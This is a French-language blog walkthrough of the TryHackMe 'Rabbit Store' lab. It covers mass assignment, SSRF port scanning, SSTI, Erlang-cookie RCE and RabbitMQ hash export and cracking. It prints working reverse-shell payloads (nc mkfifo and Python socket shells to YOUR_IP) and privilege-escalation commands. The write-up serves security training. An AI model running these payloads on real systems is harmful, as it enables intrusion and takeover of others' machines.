<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Rabbit Store</title>
<meta name=description content="Platforme: TryHackMe Lien: Rabbit Store Niveau: Moyen OS: Linux Rabbit Store présente quelques services peu communs. Le défi commence par l&amp;rsquo;identification …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/fr/posts/thm-rabbit_store/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Rabbit Store"><meta property="og:description" content="Platforme: TryHackMe Lien: Rabbit Store Niveau: Moyen OS: Linux Rabbit Store présente quelques services peu communs. Le défi commence par l&amp;rsquo;identification …"><meta property="og:image" content="https://scorpiosec.com/images/THM-RabbitStore/RabbitStore.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-RabbitStore/RabbitStore.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Rabbit Store"><meta name=twitter:description content="Platforme: TryHackMe Lien: Rabbit Store Niveau: Moyen OS: Linux Rabbit Store présente quelques services peu communs. Le défi commence par l&amp;rsquo;identification …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/thm-rabbit_store/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/thm-rabbit_store/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-RabbitStore/RabbitStore.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/thm-rabbit_store/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/thm-rabbit_store/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Rabbit Store</h1><small role=doc-subtitle></small><p class=post-date>9 min read |
<span class=post-date>25 Février 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platforme: TryHackMe</li><li>Lien: <a href=https://tryhackme.com/room/rabbitstore>Rabbit Store</a></li><li>Niveau: Moyen</li><li>OS: Linux</li></ul><hr><p>Rabbit Store présente quelques services peu communs. Le défi commence par l&rsquo;identification d&rsquo;une vulnérabilité d&rsquo;assignation de masse dans une API, qui est ensuite exploitée avec une vulnérabilité SSRF pour récupérer la documentation de l&rsquo;API. L&rsquo;un des endpoints découverts est vulnérable au SSTI, ce qui nous permet d&rsquo;obtenir un accès initial au système cible. Grâce à l&rsquo;énumération, nous découvrons un cookie Erlang, ce qui nous permet de pivoter vers un autre utilisateur. Ensuite, nous escaladons nos privilèges en créant un utilisateur admin dans RabbitMQ et en exportant un fichier contenant des informations sensibles, y compris le hachage du mot de passe de l&rsquo;utilisateur root. En formatant correctement le hachage, nous récupérons finalement le mot de passe de l&rsquo;utilisateur root et parvenons à compromettre complètement le système.</p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -T4 -sC -sV -Pn -p- -oA nmap/Rabbit_Store {TARGET_IP}
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-02-24 21:15 CST
</span></span><span style=display:flex><span>Warning: 10.10.117.80 giving up on port because retransmission cap hit <span style=color:#56b6c2>(</span>6<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.117.80
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.19s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65521</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT      STATE    SERVICE      VERSION
</span></span><span style=display:flex><span>22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp    open     http         Apache httpd 2.4.52
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.52 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://cloudsite.thm/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3026/tcp  filtered agri-gateway
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>4369/tcp  open     epmd         Erlang Port Mapper Daemon
</span></span><span style=display:flex><span>| epmd-info: 
</span></span><span style=display:flex><span>|   epmd_port: <span style=color:#d19a66>4369</span>
</span></span><span style=display:flex><span>|   nodes: 
</span></span><span style=display:flex><span>|_    rabbit: <span style=color:#d19a66>25672</span>
</span></span><span style=display:flex><span>12606/tcp filtered unknown
</span></span><span style=display:flex><span>14949/tcp filtered unknown
</span></span><span style=display:flex><span>18309/tcp filtered unknown
</span></span><span style=display:flex><span>25672/tcp open     unknown
</span></span><span style=display:flex><span>25890/tcp filtered unknown
</span></span><span style=display:flex><span>26284/tcp filtered unknown
</span></span><span style=display:flex><span>35021/tcp filtered unknown
</span></span><span style=display:flex><span>52841/tcp filtered unknown
</span></span><span style=display:flex><span>59431/tcp filtered unknown
</span></span><span style=display:flex><span>62532/tcp filtered unknown
</span></span><span style=display:flex><span>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 1250.63 seconds
</span></span></code></pre></div><p>Nmap découvre quatre ports ouverts:</p><ul><li>22 avec SSH</li><li>80 avec http, avec une redirection vers <code>cloudsite.thm</code></li><li>4369 avec epmd</li><li>25672 (c&rsquo;est le port de distribution Erlang, utilisé pour le clustering RabbitMQ)</li></ul><blockquote><p>Le service <code>epmd</code> (Erlang Port Mapper Daemon) est utilisé par les applications Erlang pour se découvrir mutuellement sur un réseau.
<em>Plus d&rsquo;informations sur le service <a href=https://www.erlang.org/docs/26/man/epmd>ici</a>.</em></p></blockquote><h2 id=enumération>Enumération</h2><p>Nous utilisons <code>nc -vz {TARGET_IP} 25672</code> pour vérifier le statut de <code>RabbitMQ</code>.</p><p><img src=/images/THM-RabbitStore/rabbitMQ_test.png alt="RabbitMQ service test"></p><p>La réponse semble indiquer que <code>RabbitMQ</code> est en cours d&rsquo;exécution sur la cible.</p><blockquote><p>RabbitMQ est un gestionnaire de messages open-source qui implémente le protocole AMQP (Advanced Message Queuing Protocol). Il est utilisé pour la communication asynchrone entre les applications, leur permettant d&rsquo;envoyer et de recevoir des messages.
<em>Pour en savoir plus, cliquez <a href=https://www.rabbitmq.com/>ici</a>.</em></p></blockquote><p>À l&rsquo;adresse <code>http://cloudsite.thm</code>, nous trouvons le site web d&rsquo;une entreprise fournissant des services cloud.</p><p><img src=/images/THM-RabbitStore/website_RabbitStore.png alt="clousite website"></p><p>Lorsque nous essayons de créer un compte, nous sommes redirigés vers <code>http://storage.cloudsite.thm/register.html</code>, nous devons mettre à jour le fichier <code>/etc/hosts</code> afin d&rsquo;y accéder.</p><p><img src=/images/THM-RabbitStore/signup_page.png alt="clousite signup page"></p><p>Nous créons un compte et essayons de nous connecter, mais nous recevons un message nous indiquant que notre compte doit être activé à <code>http://storage.cloudsite.thm/dashboard/inactive</code>.</p><p><img src=/images/THM-RabbitStore/account_activation.png alt="account activation"></p><p>Remarquant la mention <code>inactive</code> à la fin de l&rsquo;url, nous la remplaçons par <code>active</code> et obtenons le message suivant: <code>Your subscription is inactive. You cannot use our services.</code>. Il semble s&rsquo;agir d&rsquo;un point de terminaison d&rsquo;API.</p><p><img src=/images/THM-RabbitStore/api_inactive_.png alt="API inactive"></p><p>Nous nous connectons à nouveau et interceptons la requête cette fois-ci. Nous voyons une requête POST vers <code>/api/login</code>. Sa réponse contient un JWT (JSON Web Token), et nous pouvons voir le <code>inactive</code> à la fin (le statut actuel de notre compte/abonnement).</p><p><img src=/images/THM-RabbitStore/JWT_login.png alt="POST request to /api/login"></p><p>Essayons de trouver d&rsquo;autres points de terminaison d&rsquo;API avec ffuf.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://storage.cloudsite.thm/api/FUZZ -ic -fc 404
</code></pre><p>Nous en découvrons d&rsquo;autres, mais nous ne pouvons pas accéder aux deux derniers:</p><ul><li><code>/register</code></li><li><code>/docs</code></li><li><code>/uploads</code></li></ul><p><img src=/images/THM-RabbitStore/api_ffuf.png alt="directory brute forcing on /api"></p><p><img src=/images/THM-RabbitStore/api_docs.png alt="access denied to /api/docs"></p><p><img src=/images/THM-RabbitStore/api_uploads.png alt="access denied to /api/uploads"></p><h3 id=vulnérabilité-mass-assignment>Vulnérabilité Mass Assignment</h3><p>Nous utilisons <a href=https://jwt.io/>jwt.io</a> pour analyser le jeton. Nous voyons en effet que notre abonnement est marqué comme <code>inactif</code> dans le payload décodé.</p><p><img src=/images/THM-RabbitStore/decoded_JWT.png alt="decoded JWT"></p><p>Nous enregistrons un compte et ajoutons manuellement <code>"subscription":"active"</code> à la requête POST vers <code>/api/register</code>.</p><p><img src=/images/THM-RabbitStore/mass_assign.png alt="mass assignment vulnerability"></p><p>Notre requête est acceptée!</p><p><img src=/images/THM-RabbitStore/mass_assign1.png alt="mass assignment vulnerability successful"></p><p>We login and now have access to <code>http://storage.cloudsite.thm/dashboard/active</code>, where we find a file upload feature.</p><blockquote><p>La vulnérabilité que nous avons exploitée est connue sous le nom de vulnérabilité du type <code>mass assignment</code> (affectation de masse). Elle se produit lorsqu&rsquo;une API permet la modification de champs qui ne devraient pas être directement manipulés par les utilisateurs, tels que des attributs sensibles ou internes.</p></blockquote><h3 id=exploitation-du-ssrf>Exploitation du SSRF</h3><p>Nous pouvons uploader un fichier à partir de notre ordinateur ou depuis une URL.</p><p><img src=/images/THM-RabbitStore/dashboard_active.png alt="access to /dashboard/active"></p><p><img src=/images/THM-RabbitStore/upload_url.png alt="upload files from url option"></p><p>Une fonctionnalité acceptant une URL soumise par l&rsquo;utilisateur peut potentiellement signifier une vulnérabilité SSRF, alors testons là.</p><p>Nous créons un fichier de test et démarrons un serveur python sur notre machine locale.</p><pre tabindex=0><code>echo &#39;let_me_in&#39; &gt; SSRF_test.txt

python3 -m http.server
</code></pre><p><img src=/images/THM-RabbitStore/SSRF_vuln_test.png alt="SSRF vulnerability test"></p><p>Sur le site web, nous entrons l&rsquo;url de notre serveur web.</p><pre tabindex=0><code>http://{YOUR_IP}:{PORT}/{FILENAME}
</code></pre><p><img src=/images/THM-RabbitStore/url_sub.png alt="file submission via url"></p><p>La procédure fonctionne, nous recevons une demande sur notre serveur web et le fichier est téléchargé avec succès sur la cible.</p><p><img src=/images/THM-RabbitStore/ssrf_200.png alt="http 200 on web server"></p><p><img src=/images/THM-RabbitStore/upload.png alt="file successfully stored on the target"></p><p>Après avoir rafraîchi la page, nous pouvons le voir sous la rubrique <code>Uploaded Files</code> (Fichiers téléchargés).</p><p><img src=/images/THM-RabbitStore/uploaded_files.png alt="uploaded file list"></p><p>Lorsque nous cliquons sur le lien du fichier sous <code>Uploaded Files</code>, une requête GET est envoyée à <code>/api/uploads/xxxxx</code>. Cette requête est utilisée pour télécharger les fichiers.</p><p><img src=/images/THM-RabbitStore/api_uploads_req.png alt="GET request to /api/uploads"></p><p>Nous pouvons à présent accéder à <code>http://storage.cloudsite.thm/api/uploads</code>.</p><p><img src=/images/THM-RabbitStore/api_uploads_access.png alt="successful access to /api/uploads"></p><p>La fonction de téléversement via URL envoie une requête à <code>/api/store-url</code>.</p><p><img src=/images/THM-RabbitStore/api_store_url.png alt="request to /api/store-url"></p><p>Nous allons essayer d&rsquo;accéder à <code>/api/docs</code> par le biais du SSRF.</p><p><img src=/images/THM-RabbitStore/SSRF_api_docs_1.png alt="Attempt to access /api/docs via SSRF"></p><p>La requête est réussie mais le fichier téléchargé ne contient qu&rsquo;une erreur <code>404</code>.</p><p><img src=/images/THM-RabbitStore/404_file_dl.png alt="downloaded file contains 404 error"></p><h4 id=balayage-des-ports-internes-via-ssrf>Balayage des ports internes via SSRF</h4><p>Essayons de trouver des ports internes ouverts sur la cible.</p><blockquote><p>La même méthode est utilisée dans <a href=https://scorpiosec.com/fr/posts/thm-creative/#balayage-des-ports-internes-via-ssrf>THM: Creative</a>.
Tous ces paramètres proviennent de la requête POST vers <code>/api/store-url</code>.</p></blockquote><pre tabindex=0><code>ffuf -u &#34;http://storage.cloudsite.thm/api/store-url&#34; \
-X POST \
-H &#34;Content-Type: application/json&#34; \
-H &#34;Cookie: jwt=YOUR_JWT_VALUE&#34; \
-d &#39;{&#34;url&#34;:&#34;http://127.0.0.1:FUZZ&#34;}&#39; \
-w &lt;(seq 1 65535) \
-mc all \
-t 100 \
-fs 41
</code></pre><p>Nous découvrons quelques ports.</p><p><img src=/images/THM-RabbitStore/SSRF_internal_ports.png alt="Internal port scan via SSRF"></p><p>Nous allons essayer d&rsquo;atteindre <code>/api/docs</code>.</p><pre tabindex=0><code>http://127.0.0.1:3000/api/docs
</code></pre><p><img src=/images/THM-RabbitStore/api_docs_upload.png alt="second attempt to access /api/docs"></p><p>Cette fois, nous obtenons le bon fichier, détaillant tous les points de terminaison de l&rsquo;API. Nous connaissions déjà la plupart d&rsquo;entre eux, le nouveau est <code>/api/fetch_messeges_from_chatbot</code>.</p><p><img src=/images/THM-RabbitStore/api_docs_file.png alt="Successfully retrieve /api/docs"></p><h3 id=exploitation-du-ssti>Exploitation du SSTI</h3><p>Le fichier nous indique que nous devons utiliser une requête POST pour y accéder. Commençons donc par capturer la requête vers <code>http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot</code>.</p><p>Comme attendu, nous obtenons <code>GET method not allowed</code>.</p><p><img src=/images/THM-RabbitStore/GET_chatbot.png alt="GET request to /api/fetch_messeges_from_chatbot"></p><p>Nous la transformons en requête POST et l&rsquo;envoyons à nouveau. Nous obtenons alors une erreur 500.</p><p><img src=/images/THM-RabbitStore/internal_error_chatbot.png alt="http 500 error to POST request"></p><p>Puisque nous interagissons avec l&rsquo;API, ajoutons <code>Content-Type : application/json</code> à notre requête et essayons d&rsquo;envoyer quelques paramètres aléatoires.</p><p><img src=/images/THM-RabbitStore/custom_req_chatbot.png alt="username parameter required"></p><p>Il nous indique qu&rsquo;un paramètre username (nom d&rsquo;utilisateur) est nécessaire. Après l&rsquo;avoir ajouté, on nous dit que le chatbot est en cours de développement. Nous remarquons que la réponse inclut le nom d&rsquo;utilisateur que nous avons envoyé et que tout nom différent produit la même réponse.</p><p>Il y a probablement une sorte de modèle utilisé en arrière-plan qui ressemble à ceci: <code>Sorry, $username, our chatbot server is currently under development.</code> (Désolé, $username, notre serveur de chatbot est actuellement en cours de développement).</p><p><img src=/images/THM-RabbitStore/chatbot_response.png alt="successful POST request to /api/fetch_messeges_from_chatbot"></p><p>Nous allons tester une vulnérabilité SSTI (Server Side Template Injection). Sur <a href=https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#identify>HackTricks</a> nous trouvons de nombreux payloads.</p><p>Le payload est bel et bien exécuté!</p><p><img src=/images/THM-RabbitStore/SSTI_confirmed.png alt="SSTI confirmed"></p><h2 id=accès-initial-shell-en-tant-que-azrael>Accès initial (shell en tant que azrael)</h2><p>Bien que le payload fonctionne, je me demande pourquoi c&rsquo;est le cas &#x1f914;.</p><p>Parce que cette application utilise le framework Express et <code>{{7*7}}</code> est un payload pour <code>Jinja2 (Python)</code>.</p><p><img src=/images/THM-RabbitStore/rabbit_store_techstack.png alt="Rabbit Store tech stack"></p><p>Nous tentons d&rsquo;obtenir un shell inversé avec le payload suivant:</p><pre tabindex=0><code>{{ config.__class__.__init__.__globals__[&#39;os&#39;].system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc YOUR_IP PORT_NUMBER &gt;/tmp/f&#39;) }}
</code></pre><p><img src=/images/THM-RabbitStore/SSTI_RCE.png alt="SSTI for RCE"></p><p>Après avoir envoyé la requête, nous obtenons un shell sous le nom de <code>azrael</code> sur notre listener. Nous pouvons également améliorer le shell avec les commandes ci-dessous.</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
</code></pre><p><img src=/images/THM-RabbitStore/user_flag.png alt="foothold and user flag"></p><h3 id=shell-en-tant-que-rabbitmq>Shell en tant que rabbitmq</h3><p>Linpeas trouve un fichier Erlang appelé <code>.erlang.cookie</code> dans <code>/var/lib/rabbitmq/</code>. Le fichier appartient à l&rsquo;utilisateur <code>rabbitmq</code>.</p><p><img src=/images/THM-RabbitStore/erlang_file.png alt="Erlang file found"></p><p>Nous nous souvenons que notre scan nmap a trouvé les ports <code>4369</code> et <code>25672</code> ouverts.</p><p>Sur <a href=https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection>cette page HackTricks</a>, nous apprenons quelques méthodes pour obtenir un RCE en utilisant le cookie Erlang. Cependant, nous devons modifier légèrement la commande, au lieu de <code>couchdb@localhost</code> nous utilisons <code>rabbit@forge</code> (forge est le nom de l&rsquo;hôte cible).</p><pre tabindex=0><code>HOME=/ erl -sname kscorpio -setcookie CCOKIE_FOUND


rpc:call(&#39;rabbit@forge&#39;, os, cmd, [&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;YOUR_IP\&#34;, PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#39;&#34;]).
</code></pre><p><img src=/images/THM-RabbitStore/erl_rce.png alt="Erlang Cookie RCE"></p><p>Sur notre listener, nous avons maintenant un shell sous le nom de <code>rabbitmq</code>.</p><p><img src=/images/THM-RabbitStore/rabbitmq_shell.png alt="rabbitmq shell"></p><p>Maintenant que nous sommes <code>rabbitmq</code>, nous pouvons utiliser <code>rabbitmqctl</code>. Nous essayons d&rsquo;abord <code>list_users</code> mais il renvoie une erreur.</p><pre tabindex=0><code>rabbitmqctl list_users
</code></pre><p><img src=/images/THM-RabbitStore/list_users.png alt="failed rabbitmq list_users command"></p><p>Nous corrigeons les permissions du fichier et exécutons à nouveau la commande.</p><pre tabindex=0><code>chmod 400 /var/lib/rabbitmq/.erlang.cookie
</code></pre><p><img src=/images/THM-RabbitStore/rabbitmq_list_users.png alt="successful rabbitmq list_users command"></p><p>Nous obtenons le message:</p><pre tabindex=0><code>The password for the root user is the SHA-256 hashed value of the RabbitMQ root user&#39;s password. Please don&#39;t attempt to crack SHA-256.
</code></pre><blockquote><p>Le mot de passe de l&rsquo;utilisateur root est la valeur SHA-256 du mot de passe de l&rsquo;utilisateur root de RabbitMQ. N&rsquo;essayez pas de craquer SHA-256.</p></blockquote><h2 id=escalade-des-privilèges-shell-en-tant-que-root>Escalade des privilèges (shell en tant que root)</h2><p><a href=https://www.rabbitmq.com/docs/definitions>Cette page</a> nous apprends que RabbitMQ stocke les informations dans des <code>définitions</code>, ces fichiers peuvent être exportés sous forme de fichier JSON. Nous pouvons abuser de nos privilèges pour créer un nouvel utilisateur et réaliser cette opération.</p><pre tabindex=0><code>rabbitmqctl add_user kscorpio kscorpio 
rabbitmqctl set_permissions -p / kscorpio &#34;.*&#34; &#34;.*&#34; &#34;.*&#34;
rabbitmqctl set_user_tags kscorpio administrator
rabbitmqadmin export rabbit.definitions.json -u kscorpio -p kscorpio
</code></pre><p><img src=/images/THM-RabbitStore/rabbitmq_privesc.png alt="rabbitmq export definitions"></p><p>À l&rsquo;intérieur du fichier, nous trouvons le hachage du mot de passe root.</p><p><img src=/images/THM-RabbitStore/rabbitmq_pwd_hash.png alt="root password hash in json file"></p><p>Pour craquer un hash RabbitMQ avec un outil tel que hashcat, nous devons d&rsquo;abord le formater. Sur <a href=https://github.com/QKaiser/cottontail/issues/27>cette page Github</a>, nous apprenons comment le faire.</p><pre tabindex=0><code>echo &#34;RABBITMQ_HASH&#34; | base64 -d | xxd -pr -c128 | perl -pe &#39;s/^(.{8})(.*)/$2:$1/&#39; &gt; hash.txt


hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><blockquote><p>Dans notre cas, nous n&rsquo;avons pas besoin de la deuxième étape.</p></blockquote><p>La documentation disponible <a href=https://www.rabbitmq.com/docs/passwords#hash-via-http-api>ici</a> nous indique que les hashs utilisent un sel de <code>32 bit</code> (4 octets) et nous savons que : &ldquo;le mot de passe de l&rsquo;utilisateur root est la valeur SHA-256 du mot de passe de l&rsquo;utilisateur root de RabbitMQ&rdquo;.</p><p>Le mot de passe est donc simplement constitué de tous les caractères moins le sel (notre hachage formaté sépare les deux pour nous). Nous l&rsquo;utilisons et sommes en mesure de lire le drapeau root.</p><p><img src=/images/THM-RabbitStore/root_pwd.png alt="root password"></p><p><img src=/images/THM-RabbitStore/root_flag.png alt="access to the root account"></p><h2 id=ressources-complémentaires>Ressources complémentaires</h2><p>Merci d&rsquo;avoir pris le temps de lire cet article. Cette room est une excellente introduction à de nouvelles exploitations (du moins pour moi). Vous trouverez ci-dessous des ressources supplémentaires (et gratuites) pour vous exercer aux vulnérabilités présentées:</p><ul><li>Apprendre à exploiter les vulnérabilités mass assignment avec PortSwigger <a href=https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability>ici</a>.</li><li>En apprendre plus sur le <a href=https://portswigger.net/web-security/ssrf>SSRF</a> et le <a href=https://portswigger.net/web-security/server-side-template-injection>SSTI</a> avec PortSwigger.</li><li>Les méthodes permettant d&rsquo;obtenir un RCE en abusant du cookie Erlang sont disponibles <a href=https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection>here</a>.</li></ul></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-yummy/>&#8592;
Précédent:
HTB: Yummy</a></p><p class=prev-post-date>février 22, 2025</p></div><div class=next-post><p><a href=/fr/posts/htb-apaxheblaze/>Suivant:
HTB Challenge: ApacheBlaze
&#8594;</a></p><p class=next-post-date>mars 1, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a><ul><li><a href=#vulnérabilité-mass-assignment>Vulnérabilité Mass Assignment</a></li><li><a href=#exploitation-du-ssrf>Exploitation du SSRF</a><ul><li><a href=#balayage-des-ports-internes-via-ssrf>Balayage des ports internes via SSRF</a></li></ul></li><li><a href=#exploitation-du-ssti>Exploitation du SSTI</a></li></ul></li><li><a href=#accès-initial-shell-en-tant-que-azrael>Accès initial (shell en tant que azrael)</a><ul><li><a href=#shell-en-tant-que-rabbitmq>Shell en tant que rabbitmq</a></li></ul></li><li><a href=#escalade-des-privilèges-shell-en-tant-que-root>Escalade des privilèges (shell en tant que root)</a></li><li><a href=#ressources-complémentaires>Ressources complémentaires</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>